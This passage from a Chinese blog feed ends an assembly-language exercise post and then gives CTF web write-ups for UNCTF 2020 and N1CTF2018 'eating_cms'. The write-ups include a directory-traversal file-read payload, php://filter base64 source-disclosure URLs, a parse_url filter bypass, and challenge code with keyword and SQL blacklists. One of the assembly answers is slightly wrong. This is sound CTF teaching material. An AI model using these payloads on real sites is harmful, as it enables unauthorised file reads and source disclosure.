class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">〔解答)              CF ZF SF OF PF</span><br><span class="line">mov al,89h  ;AL=89h </span><br><span class="line">add al,al   ;AL=12h  1  0  0  1  1</span><br><span class="line">;1000 1001</span><br><span class="line">+1000 1001</span><br><span class="line">————————————</span><br><span class="line">10001 0010</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add al,9dh  ;AL=Oafh 0  0  1  0  1</span><br><span class="line">;0001 0010</span><br><span class="line">+1001 1101</span><br><span class="line">————————————</span><br><span class="line"> 1010 1111</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmp al,0bch ;AL=0afh 1  0  1  0  1</span><br><span class="line">;1010 1111</span><br><span class="line">-1011 1100</span><br><span class="line">————————————</span><br><span class="line"> 0100 0011</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sub al,al   ;AL=00h  0  1  0  0  1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dec al      ;AL=Offh 0  0  1  0  1</span><br><span class="line">;0000 0000</span><br><span class="line">-0000 0001</span><br><span class="line">————————————</span><br><span class="line"> 1111 1111</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inc al      ;AL=00h  0  1  0  0  1</span><br><span class="line">;1111 1111</span><br><span class="line">+0000 0001</span><br><span class="line">————————————</span><br><span class="line"> 1111 1111</span><br></pre></td></tr></table></figure><h5 id="15-什么是短转移SHORT、近转移NEAR和远转移FAR？什么是段内转移和段间转移？"><a href="#15-什么是短转移SHORT、近转移NEAR和远转移FAR？什么是段内转移和段间转移？" class="headerlink" title="15.什么是短转移SHORT、近转移NEAR和远转移FAR？什么是段内转移和段间转移？"></a>15.什么是短转移SHORT、近转移NEAR和远转移FAR？什么是段内转移和段间转移？</h5><p><strong><a href="https://blog.csdn.net/SmartLoveyu/article/details/90209810">引用自此</a></strong></p><blockquote><p>短转移、近转移、远转移<br>首先，短转移是最短的，近转移和远转移是相对的近和远。</p></blockquote><h6 id="关于位移量"><a href="#关于位移量" class="headerlink" title="关于位移量"></a><strong>关于位移量</strong></h6><p>短转移（JMP SHORT LABEL）的位移量：IP ← IP + 8位的位移量<br>近转移（JMP NEAR PTR LABEL）的位移量：IP ← IP + 16位的位移量<br>远转移（JMP FAR PTR LABEL）的位移量：IP ← LABEL的偏移地址，CS ← LABEL的段基址</p><h6 id="关于三种转移的IP值"><a href="#关于三种转移的IP值" class="headerlink" title="关于三种转移的IP值"></a><strong>关于三种转移的IP值</strong></h6><p>短转移：JMP位置的IP值加2，即IP指向了下一条指令，再加上IP+1位置的一个8bit位移量。<br>近转移：因为位移量是16bit，需要占两个字节，所以JMP位置的IP值加3，再加上IP+1和IP+2组成的位移量。<br>远转移：采用段加偏移，CS的值在高地址、IP值在低地址</p><h6 id="gt-关于此题目"><a href="#gt-关于此题目" class="headerlink" title="&gt;关于此题目"></a>&gt;<strong>关于此题目</strong></h6><p><strong>一解</strong></p><blockquote><p>短转移(SHORT)，近转移(NEAR)和远转移(FAR)。短转移是指要跳至的目标地址与当前地址前后相差不超过128字节。近转移是指跳转的目标地址与当前地址在用一个段内，即CS的值不变，只改变EIP的值。远转移指跳到另一个代码段去执行，CS&#x2F;EIP都要改变。<br><strong>二解</strong><br>短转移:  指段内―128<code>~</code>127之间的转移，位移量用一个字节表示近转移:指段内+32K之间的转移，位移量用一个字表示<br>远转移:  指段间1MB范围的转移<br>段内转移:指在同一个代码段内的转移，可以是短转移或者近转移<br>段间转移:指转移到另外一个代码段，就是远转移</p></blockquote><h5 id="16-假设DS-x3D-2000H，BX-x3D-1256H，SI-x3D-528FH，位移量TABLE-x3D-20A1H，-232F7H-x3D-3280H，264E5H-x3D-2450H，执行下列段内间接寻址的转移指令后，转移的目的地址是什么？"><a href="#16-假设DS-x3D-2000H，BX-x3D-1256H，SI-x3D-528FH，位移量TABLE-x3D-20A1H，-232F7H-x3D-3280H，264E5H-x3D-2450H，执行下列段内间接寻址的转移指令后，转移的目的地址是什么？" class="headerlink" title="16.假设DS&#x3D;2000H，BX&#x3D;1256H，SI&#x3D;528FH，位移量TABLE&#x3D;20A1H，[232F7H]&#x3D;3280H，264E5H&#x3D;2450H，执行下列段内间接寻址的转移指令后，转移的目的地址是什么？"></a>16.假设DS&#x3D;2000H，BX&#x3D;1256H，SI&#x3D;528FH，位移量TABLE&#x3D;20A1H，[232F7H]&#x3D;3280H，264E5H&#x3D;2450H，执行下列段内间接寻址的转移指令后，转移的目的地址是什么？</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JMP BX</span><br><span class="line">JMP TABLE[BX]</span><br><span class="line">JMP [BX][SI]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;解答&gt;</span><br><span class="line">(1）转移的有效地址EA=BX=1256H</span><br><span class="line">(2）转移的有效地址EA=[DS:20A1H+1256H]=[232F7]=3280H</span><br><span class="line">(3）转移的有效地址EA=[DS :1256H+528FH]=264E5H=2450H</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编语言与接口技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unctf之web</title>
      <link href="/2020/11/17/unctf%E4%B9%8Bweb/"/>
      <url>/2020/11/17/unctf%E4%B9%8Bweb/</url>
      
        <content type="html"><![CDATA[<p><strong>练习场做点题</strong></p><h1 id="1-easy-ssrf"><a href="#1-easy-ssrf" class="headerlink" title="1.easy_ssrf"></a>1.easy_ssrf</h1><p><strong>Tag:ssrf，preg_match绕过</strong><br>下面给出源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/unctf\.com/&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|file|zip|bzip|zlib|base|data/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="variable">$url</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;error!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传<code>?url=unctf.com/../../../../../flag</code>直接获取flag，这算是目录穿越⑧</p><blockquote><p>file_get_contents使用不存在的协议名（对此来说，unctf.com应当就相当于不能识别的伪协议名）导致目录穿越，实现SSRF<br>php源码中，在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录。</p></blockquote><h1 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h1>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>N1CTF2018</title>
      <link href="/2020/11/17/N1CTF2018/"/>
      <url>/2020/11/17/N1CTF2018/</url>
      
        <content type="html"><![CDATA[<blockquote><p>今天准备做个一般的来着呢，结果没做出来，菜死了。做个简单的水一篇文章。</p></blockquote><h1 id="1-eating-cms"><a href="#1-eating-cms" class="headerlink" title="1.eating_cms"></a>1.eating_cms</h1><p>找到注册界面<code>register.php</code>，php伪协议<code>http://8d685461-9fb9-4fb1-aab8-6b31ee37af4b.node3.buuoj.cn/user.php?page=php://filter/convert.base64-encode/resource=user#</code><br><code>user.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;function.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>( !<span class="keyword">isset</span>( <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] ))&#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;isadmin&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$oper_you_can_do</span> = <span class="variable">$OPERATE_admin</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$oper_you_can_do</span> = <span class="variable">$OPERATE</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//die($_SESSION[&#x27;isadmin&#x27;]);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;isadmin&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]) || <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$page</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])|| <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$page</span> = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$page</span> === <span class="string">&#x27;info&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line"><span class="comment">//            echo(&quot;&lt;script&gt;alert(&#x27;no premission to visit info, only admin can, you are guest&#x27;)&lt;/script&gt;&quot;);</span></span><br><span class="line">            <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location: user.php?page=guest&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">filter_directory</span>();</span><br><span class="line"><span class="comment">//if(!in_array($page,$oper_you_can_do))&#123;</span></span><br><span class="line"><span class="comment">//    $page = &#x27;info&#x27;;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;<span class="subst">$page</span>.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后看<code>function.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://8d685461-9fb9-4fb1-aab8-6b31ee37af4b.node3.buuoj.cn/user.php?page=php://filter/convert.base64-encode/resource=function#</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Hacker</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location: hacker.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$keywords</span> = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;manage&quot;</span>,<span class="string">&quot;ffffllllaaaaggg&quot;</span>];</span><br><span class="line">    <span class="variable">$uri</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_URI&quot;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$uri</span>[<span class="string">&#x27;query&#x27;</span>], <span class="variable">$query</span>);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$keywords</span> <span class="keyword">as</span> <span class="variable">$token</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$k</span>, <span class="variable">$token</span>))</span><br><span class="line">                <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$v</span>, <span class="variable">$token</span>))</span><br><span class="line">                <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_directory_guest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$keywords</span> = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;manage&quot;</span>,<span class="string">&quot;ffffllllaaaaggg&quot;</span>,<span class="string">&quot;info&quot;</span>];</span><br><span class="line">    <span class="variable">$uri</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_URI&quot;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$uri</span>[<span class="string">&#x27;query&#x27;</span>], <span class="variable">$query</span>);</span><br><span class="line"><span class="comment">//    var_dump($query);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$keywords</span> <span class="keyword">as</span> <span class="variable">$token</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$k</span>, <span class="variable">$token</span>))</span><br><span class="line">                <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$v</span>, <span class="variable">$token</span>))</span><br><span class="line">                <span class="title function_ invoke__">hacker</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="variable">$blacklist</span> = <span class="string">&quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;</span>;</span><br><span class="line">    <span class="variable">$whitelist</span> = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="string">&quot;<span class="subst">$whitelist</span>&quot;</span>, <span class="variable">$string</span>[<span class="variable">$i</span>]) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">Hacker</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$blacklist</span>/is&quot;</span>, <span class="variable">$string</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">Hacker</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$string</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">real_escape_string</span>(<span class="variable">$string</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_query</span>(<span class="params"><span class="variable">$sql_query</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql_query</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">Filter</span>(<span class="variable">$user</span>);</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from `albert_users` where `username_which_you_do_not_know`= &#x27;<span class="subst">$user</span>&#x27; and `password_which_you_do_not_know_too` = &#x27;<span class="subst">$pass</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">sql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="comment">//    var_dump($res);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$res</span>-&gt;num_rows) &#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>();</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$data</span>[username_which_you_do_not_know];</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;isadmin&#x27;</span>] = <span class="variable">$data</span>[isadmin_which_you_do_not_know_too_too];</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateadmin</span>(<span class="params"><span class="variable">$level</span>,<span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;<span class="subst">$level</span>&#x27; where `username_which_you_do_not_know`=&#x27;<span class="subst">$user</span>&#x27; &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">sql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="comment">//    var_dump($res);</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//    die($res);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$res</span> == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">Filter</span>(<span class="variable">$user</span>);</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#x27;<span class="subst">$user</span>&#x27;,&#x27;<span class="subst">$pass</span>&#x27;,&#x27;0&#x27;)&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">sql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$mysqli</span>-&gt;insert_id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面有个奇怪的被过滤的字符串为<code>ffffllllaaaaggg</code><br><code>/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code><br>再次尝试读取的时候遭到了阻力，被检测跳到了<code>hacker.php</code>界面，这个可以根据<code>parse_str($uri[&#39;query&#39;], $query);</code>的解析漏洞来绕过</p><blockquote><p>上面的那个解析漏洞说的就是url的格式不能太离谱，太离谱就会返回false，就像下面的请求一样。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://8d685461-9fb9-4fb1-aab8-6b31ee37af4b.node3.buuoj.cn//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg#</span><br></pre></td></tr></table></figure><p>得到<code>ffffllllaaaaggg.php</code>文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (FLAG_SIG != <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;you can not visit it directly&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you can find sth in m4aaannngggeee&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 